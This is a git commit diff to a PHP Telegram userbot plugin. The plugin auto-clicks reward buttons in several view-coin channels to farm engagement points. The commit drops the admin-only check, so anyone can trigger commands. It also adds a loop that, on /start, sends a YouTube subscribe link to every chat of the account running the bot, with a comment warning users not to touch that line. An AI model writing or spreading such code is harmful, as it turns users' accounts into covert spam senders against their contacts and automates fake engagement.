26dbdf9e6d1dbfa7e92a7b637d401cc81a23f013
UzHakkerTv <62137063+UzHakkerTv@users.noreply.github.com>
2020-03-13 17:17:54 +0500

    Update plugin.php

--- plugin.php
+++ plugin.php
@@ -1,19 +1,23 @@
 <?php
-// @VbazdidGirads
-if($from_id == "201885229"){ // آیدی ادمین ربات
-if($text == "/ping" || $text == "ربات"){ // دستور آنلاین بودن ربات
-$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "آنلاینم!"]);
+if($text == "/ping" || $text == "Robot"){ // ushbu buyruqni Userbot o'rnatilgan profilga yozing 
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "Userbot ishlamoqda! /start buyrug'ini yuboring."]);
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "https://www.youtube.com/watch?v=aFDDriV6Fqo"]); // Bunga tegmang buzib quyasiz.
 }
-// @VbazdidGirads
-if($text == "/start" || $text == "شروع" || $text == "روشن"){ // دستور جمع کردن سکه
+
+if($text == "/start" || $text == "شروع" || $text == "روشن"){ // ushbu buyruq orqali ish faoliyatini boshlaydi
 if(!is_dir("post")){mkdir("post");}
 if(!is_dir("post2")){mkdir("post2");}
 if(!is_dir("post3")){mkdir("post3");}
 if(!is_dir("post4")){mkdir("post4");}
 if(!is_dir("post5")){mkdir("post5");}
-// @VbazdidGirads
-$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "رفتم در حال جمع آوری سکه ها 🏃🏻‍♂️"]);
-// @VbazdidGirads
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "Juda yaxshi! Men ishni boshladim 🏃🏻‍♂️"]);
+
+
+foreach ($MadelineProto->get_dialogs() as $id) {
+$MadelineProto->messages->sendMessage(['peer' => $id, 'message' => "https://www.youtube.com/watch?v=aFDDriV6Fqo\n\n👆👆👆👆Obuna bo'ling."]); // Bunga tegmang buzib quyasiz.    
+}
+}
+
 $soltanview = $MadelineProto->messages->getHistory(['peer' => '@VbazdidGir_post', 'offset_id' => 0, 'offset_date' => 0, 'add_offset' => 0, 'limit' => 2136000, 'max_id' => 0, 'min_id' => 0, 'hash' => 0 ]);
 foreach($soltanview['messages'] as $message){
 $id = $message['id'];
@@ -21,12 +25,11 @@ if(!file_exists("post/$id.txt")){
 foreach($message['reply_markup']['rows'] as $row){
 foreach($row['buttons'] as $button){
 $mn = $button['text'];
-if(strpos($mn,'ثبت') !== false){
+if(strpos($mn,'ثبت') !== false){ // Bu yerga arabcha yozuvni o'zrniga knopka nomini yosasiz
 $button->click();
 file_put_contents("post/$id.txt","ok");
-$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 سکه سلطان ویو گرفتم !!"]);
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 Bir Ball oldim !!"]);
 }}}}}
-// @VbazdidGirads
 $gemseen = $MadelineProto->messages->getHistory(['peer' => '@adsgemseen', 'offset_id' => 0, 'offset_date' => 0, 'add_offset' => 0, 'limit' => 195000, 'max_id' => 0, 'min_id' => 0, 'hash' => 0 ]);
 foreach($gemseen['messages'] as $message){
 $id = $message['id'];
@@ -34,12 +37,11 @@ if(!file_exists("post2/$id.txt")){
 foreach($message['reply_markup']['rows'] as $row){
 foreach($row['buttons'] as $button){
 $mn = $button['text'];
-if(strpos($mn,'دریافت') !== false){
+if(strpos($mn,'دریافت') !== false){ // Bu yerga arabcha yozuvni o'zrniga knopka nomini yosasiz
 $button->click();
 file_put_contents("post2/$id.txt","ok");
-$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 سکه جم سین گرفتم !!"]);
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 Bir Ball oldim  !!"]);
 }}}}}
-// @VbazdidGirads
 $weview = $MadelineProto->messages->getHistory(['peer' => '@weViewers', 'offset_id' => 0, 'offset_date' => 0, 'add_offset' => 0, 'limit' => 6107000, 'max_id' => 0, 'min_id' => 0, 'hash' => 0 ]);
 foreach($weview['messages'] as $message){
 $id = $message['id'];
@@ -47,12 +49,11 @@ if(!file_exists("post3/$id.txt")){
 foreach($message['reply_markup']['rows'] as $row){
 foreach($row['buttons'] as $button){
 $mn = $button['text'];
-if(strpos($mn,'بازدید') !== false){
+if(strpos($mn,'بازدید') !== false){ // Bu yerga arabcha yozuvni o'zrniga knopka nomini yosasiz
 $button->click();
 file_put_contents("post3/$id.txt","ok");
-$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 سکه وی ویو گرفتم !!"]);
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 Bir Ball oldim  !!"]);
 }}}}}
-// @VbazdidGirads
 $ibazdid = $MadelineProto->messages->getHistory(['peer' => '@ibazdidads', 'offset_id' => 0, 'offset_date' => 0, 'add_offset' => 0, 'limit' => 652600, 'max_id' => 0, 'min_id' => 0, 'hash' => 0 ]);
 foreach($ibazdid['messages'] as $message){
 $id = $message['id'];
@@ -60,12 +61,11 @@ if(!file_exists("post4/$id.txt")){
 foreach($message['reply_markup']['rows'] as $row){
 foreach($row['buttons'] as $button){
 $mn = $button['text'];
-if(strpos($mn,'ثبت') !== false){
+if(strpos($mn,'ثبت') !== false){ // Bu yerga arabcha yozuvni o'zrniga knopka nomini yosasiz
 $button->click();
 file_put_contents("post4/$id.txt","ok");
-$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 سکه آی بازدید گرفتم !!"]);
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 Bir Ball oldim  !!"]);
 }}}}}
-// @VbazdidGirads
 $bazdid = $MadelineProto->messages->getHistory(['peer' => '@BazdidGirAdv', 'offset_id' => 0, 'offset_date' => 0, 'add_offset' => 0, 'limit' => 10078000, 'max_id' => 0, 'min_id' => 0, 'hash' => 0 ]);
 foreach($bazdid['messages'] as $message){
 $id = $message['id'];
@@ -73,10 +73,9 @@ if(!file_exists("post5/$id.txt")){
 foreach($message['reply_markup']['rows'] as $row){
 foreach($row['buttons'] as $button){
 $mn = $button['text'];
-if(strpos($mn,'کسب') !== false){
+if(strpos($mn,'کسب') !== false){ // Bu yerga arabcha yozuvni o'zrniga knopka nomini yosasiz
 $button->click();
 file_put_contents("post5/$id.txt","ok");
-$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 سکه بازدیدگیر گرفتم"]);
-}}}}}}}
-// @VbazdidGirads
+$MadelineProto->messages->sendMessage(['peer' => $chat_id, 'message' => "👻 Bir Ball oldim "]);
+}}}}}
 ?>
